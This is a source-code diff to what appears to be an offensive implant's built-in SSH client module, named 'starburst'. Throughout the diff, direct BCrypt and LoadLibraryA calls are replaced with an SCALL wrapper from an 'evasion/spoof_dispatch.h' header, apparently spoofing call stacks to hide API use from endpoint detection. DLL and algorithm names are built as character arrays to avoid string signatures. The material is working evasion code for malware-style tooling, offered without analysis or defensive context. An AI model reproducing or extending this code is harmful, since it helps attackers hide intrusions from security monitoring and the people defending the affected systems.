@@ -3,6 +3,7 @@
 #include <strings.h>
 #include <memory.h>
 #include <config.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_SSH
 
@@ -88,11 +89,11 @@ static bool sha256(instance& inst, const uint8_t* data, uint32_t len, uint8_t ou
     auto st = get_state(inst);
     if (!st) return false;
     BCRYPT_HASH_HANDLE h = nullptr;
-    if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0) != 0)
+    if (SCALL( inst, bcrypt_mod.BCryptCreateHash, st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0 ) != 0)
         return false;
-    inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)data, len, 0);
-    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
-    inst.bcrypt_mod.BCryptDestroyHash(h);
+    SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)data, len, 0 );
+    SCALL( inst, bcrypt_mod.BCryptFinishHash, h, out, 32, 0 );
+    SCALL( inst, bcrypt_mod.BCryptDestroyHash, h );
     return true;
 }
 
@@ -110,17 +111,17 @@ static bool sha256_multi(instance& inst, uint8_t out[32],
     auto st = get_state(inst);
     if (!st) return false;
     BCRYPT_HASH_HANDLE h = nullptr;
-    if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0) != 0)
+    if (SCALL( inst, bcrypt_mod.BCryptCreateHash, st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0 ) != 0)
         return false;
-    if (l1) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d1, l1, 0);
-    if (l2) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d2, l2, 0);
-    if (l3) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d3, l3, 0);
-    if (l4) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d4, l4, 0);
-    if (l5) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d5, l5, 0);
-    if (l6) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d6, l6, 0);
-    if (l7) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d7, l7, 0);
-    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
-    inst.bcrypt_mod.BCryptDestroyHash(h);
+    if (l1) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d1, l1, 0 );
+    if (l2) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d2, l2, 0 );
+    if (l3) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d3, l3, 0 );
+    if (l4) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d4, l4, 0 );
+    if (l5) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d5, l5, 0 );
+    if (l6) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d6, l6, 0 );
+    if (l7) SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)d7, l7, 0 );
+    SCALL( inst, bcrypt_mod.BCryptFinishHash, h, out, 32, 0 );
+    SCALL( inst, bcrypt_mod.BCryptDestroyHash, h );
     return true;
 }
 
@@ -131,19 +132,19 @@ static bool hmac_sha256(instance& inst, const uint8_t* key, uint32_t key_len,
 {
     BCRYPT_ALG_HANDLE h_alg = nullptr;
     wchar_t alg_name[] = { 'S','H','A','2','5','6', 0 };
-    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_alg, alg_name, nullptr, 0x00000008) != 0)
+    if (SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider, &h_alg, alg_name, nullptr, 0x00000008 ) != 0)
         return false;
 
     BCRYPT_HASH_HANDLE h = nullptr;
-    NTSTATUS st = inst.bcrypt_mod.BCryptCreateHash(h_alg, &h, nullptr, 0, (PUCHAR)key, key_len, 0);
+    NTSTATUS st = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptCreateHash, h_alg, &h, nullptr, 0, (PUCHAR)key, key_len, 0 );
     if (st != 0) {
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_alg, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_alg, 0 );
         return false;
     }
-    inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)data, data_len, 0);
-    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
-    inst.bcrypt_mod.BCryptDestroyHash(h);
-    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_alg, 0);
+    SCALL( inst, bcrypt_mod.BCryptHashData, h, (PUCHAR)data, data_len, 0 );
+    SCALL( inst, bcrypt_mod.BCryptFinishHash, h, out, 32, 0 );
+    SCALL( inst, bcrypt_mod.BCryptDestroyHash, h );
+    SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_alg, 0 );
     return true;
 }
 
@@ -168,10 +169,10 @@ static bool aes_ctr_crypt(instance& inst, BCRYPT_KEY_HANDLE key, uint8_t iv[16],
 
     uint32_t offset = 0;
     while (offset < len) {
-        NTSTATUS st = inst.bcrypt_mod.BCryptEncrypt(
+        NTSTATUS st = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptEncrypt,
             key, counter_block, 16, nullptr,
             nullptr, 0,
-            encrypted_counter, 16, &result_len, 0);
+            encrypted_counter, 16, &result_len, 0 );
         if (st != 0) return false;
 
         uint32_t block_len = (len - offset) < 16 ? (len - offset) : 16;
@@ -268,7 +269,7 @@ static bool ssh_send_packet(instance& inst, SshSession* sess, const uint8_t* pay
     put_u32(pkt, packet_length);
     pkt[4] = (uint8_t)padding;
     memory::copy(pkt + 5, (void*)payload, payload_len);
-    inst.bcrypt_mod.BCryptGenRandom(nullptr, pkt + 5 + payload_len, padding, 0x00000002);
+    SCALL( inst, bcrypt_mod.BCryptGenRandom, nullptr, pkt + 5 + payload_len, padding, 0x00000002 );
 
     if (sess->encrypted) {
         // compute MAC over sequence number + plaintext packet
@@ -452,7 +453,7 @@ static bool build_kexinit(instance& inst, uint8_t** out, uint32_t* out_len) {
     buf[off++] = SSH_MSG_KEXINIT;
 
     // 16 bytes cookie
-    inst.bcrypt_mod.BCryptGenRandom(nullptr, buf + off, 16, 0x00000002);
+    SCALL( inst, bcrypt_mod.BCryptGenRandom, nullptr, buf + off, 16, 0x00000002 );
     off += 16;
 
     // name-lists
@@ -513,20 +514,20 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
     // Generate ECDH keypair (nistp256)
     BCRYPT_ALG_HANDLE h_ecdh = nullptr;
     wchar_t ecdh_alg[] = { 'E','C','D','H','_','P','2','5','6', 0 };
-    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_ecdh, ecdh_alg, nullptr, 0) != 0) {
+    if (SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider, &h_ecdh, ecdh_alg, nullptr, 0 ) != 0) {
         ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider ECDH_P256 failed");
         return false;
     }
 
     BCRYPT_KEY_HANDLE h_keypair = nullptr;
     if (st->pBCryptGenerateKeyPair(h_ecdh, &h_keypair, 256, 0) != 0) {
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_ecdh, 0 );
         ssh_set_error(st, "kex: BCryptGenerateKeyPair failed");
         return false;
     }
     if (st->pBCryptFinalizeKeyPair(h_keypair, 0) != 0) {
         st->pBCryptDestroyKey(h_keypair);
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_ecdh, 0 );
         ssh_set_error(st, "kex: BCryptFinalizeKeyPair failed");
         return false;
     }
@@ -714,18 +715,18 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         wchar_t aes_alg[] = { 'A','E','S', 0 };
         wchar_t chain_ecb[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','E','C','B', 0 };
 
-        if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_aes, aes_alg, nullptr, 0) != 0) {
+        if (SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider, &h_aes, aes_alg, nullptr, 0 ) != 0) {
             ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider AES failed"); goto fail_kex; }
-        inst.bcrypt_mod.BCryptSetProperty(h_aes, (LPCWSTR)L"ChainingMode",
-            (PUCHAR)chain_ecb, sizeof(chain_ecb), 0);
+        SCALL( inst, bcrypt_mod.BCryptSetProperty, h_aes, (LPCWSTR)L"ChainingMode",
+            (PUCHAR)chain_ecb, sizeof(chain_ecb), 0 );
 
         // check which key size the negotiation selected (we prefer aes256-ctr → 32-byte keys)
-        if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->enc_key, nullptr, 0, key_cs, 32, 0) != 0) {
-            inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
+        if (SCALL( inst, bcrypt_mod.BCryptGenerateSymmetricKey, h_aes, &sess->enc_key, nullptr, 0, key_cs, 32, 0 ) != 0) {
+            SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_aes, 0 );
             ssh_set_error(st, "kex: BCryptGenerateSymmetricKey enc failed"); goto fail_kex;
         }
-        if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->dec_key, nullptr, 0, key_sc, 32, 0) != 0) {
-            inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
+        if (SCALL( inst, bcrypt_mod.BCryptGenerateSymmetricKey, h_aes, &sess->dec_key, nullptr, 0, key_sc, 32, 0 ) != 0) {
+            SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_aes, 0 );
             ssh_set_error(st, "kex: BCryptGenerateSymmetricKey dec failed"); goto fail_kex;
         }
         sess->h_aes = h_aes;
@@ -735,13 +736,13 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
 
     inst.heap_free(pub_blob);
     st->pBCryptDestroyKey(h_keypair);
-    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
+    SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_ecdh, 0 );
     return true;
 
 fail_kex:
     if (pub_blob) inst.heap_free(pub_blob);
     st->pBCryptDestroyKey(h_keypair);
-    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
+    SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, h_ecdh, 0 );
     return false;
 }
 
@@ -1179,14 +1180,14 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     uint8_t hash[32];
     {
         BCRYPT_HASH_HANDLE h_hash = nullptr;
-        if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h_hash, nullptr, 0, nullptr, 0, 0) != 0) {
+        if (SCALL( inst, bcrypt_mod.BCryptCreateHash, st->h_sha256_plain, &h_hash, nullptr, 0, nullptr, 0, 0 ) != 0) {
             inst.heap_free(sign_data); inst.heap_free(pub_blob);
             st->pBCryptDestroyKey(h_rsa_key); inst.heap_free(decoded_buf);
             return false;
         }
-        inst.bcrypt_mod.BCryptHashData(h_hash, sign_data, sign_data_len, 0);
-        inst.bcrypt_mod.BCryptFinishHash(h_hash, hash, 32, 0);
-        inst.bcrypt_mod.BCryptDestroyHash(h_hash);
+        SCALL( inst, bcrypt_mod.BCryptHashData, h_hash, sign_data, sign_data_len, 0 );
+        SCALL( inst, bcrypt_mod.BCryptFinishHash, h_hash, hash, 32, 0 );
+        SCALL( inst, bcrypt_mod.BCryptDestroyHash, h_hash );
     }
     inst.heap_free(sign_data);
 
@@ -1583,7 +1584,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
 
     // Load ws2_32.dll
     char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
-    state->h_ws2 = (HMODULE)inst.kernel32.LoadLibraryA(ws2_name);
+    state->h_ws2 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, ws2_name );
     if (!state->h_ws2) { inst.heap_free(state); return false; }
 
     #define RESOLVE_WS(name) \
@@ -1608,7 +1609,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
 
     // Resolve BCrypt ECDH APIs from bcrypt module handle
     char bcrypt_name[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
-    state->h_bcrypt = (HMODULE)inst.kernel32.LoadLibraryA(bcrypt_name);
+    state->h_bcrypt = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, bcrypt_name );
     if (!state->h_bcrypt) { inst.heap_free(state); return false; }
 
     #define RESOLVE_BC(name) \
@@ -1628,15 +1629,15 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
 
     // Open RSA algorithm provider for publickey auth
     wchar_t rsa_alg[] = { 'R','S','A', 0 };
-    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
-            &state->h_rsa, rsa_alg, nullptr, 0) != 0) {
+    if (SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider,
+            &state->h_rsa, rsa_alg, nullptr, 0 ) != 0) {
         state->h_rsa = nullptr; // non-fatal - publickey auth won't work
     }
 
     // Open plain SHA-256 provider (no HMAC flag) for SSH key derivation
     wchar_t sha256_alg[] = { 'S','H','A','2','5','6', 0 };
-    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
-            &state->h_sha256_plain, sha256_alg, nullptr, 0) != 0) {
+    if (SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider,
+            &state->h_sha256_plain, sha256_alg, nullptr, 0 ) != 0) {
         inst.heap_free(state);
         return false;
     }
@@ -1644,7 +1645,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
     // WSAStartup
     uint8_t wsa_data[512] = {};
     if (state->pWSAStartup(0x0202, wsa_data) != 0) {
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(state->h_sha256_plain, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, state->h_sha256_plain, 0 );
         inst.heap_free(state);
         return false;
     }
@@ -1664,9 +1665,9 @@ auto declfn starburst::ssh_client_destroy(instance& inst) -> void {
     }
 
     if (st->h_rsa)
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(st->h_rsa, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, st->h_rsa, 0 );
     if (st->h_sha256_plain)
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(st->h_sha256_plain, 0);
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, st->h_sha256_plain, 0 );
     if (st->wsa_started) st->pWSACleanup();
     inst.heap_free(st);
     inst.ssh_state = nullptr;
@@ -1903,7 +1904,7 @@ auto declfn starburst::ssh_disconnect(instance& inst, uint32_t session_idx) -> v
     // Cleanup crypto keys (destroy keys before closing algorithm provider)
     if (sess->enc_key) st->pBCryptDestroyKey(sess->enc_key);
     if (sess->dec_key) st->pBCryptDestroyKey(sess->dec_key);
-    if (sess->h_aes) inst.bcrypt_mod.BCryptCloseAlgorithmProvider(sess->h_aes, 0);
+    if (sess->h_aes) SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, sess->h_aes, 0 );
 
     if (sess->key_data) {
         memory::zero(sess->key_data, sess->key_len);
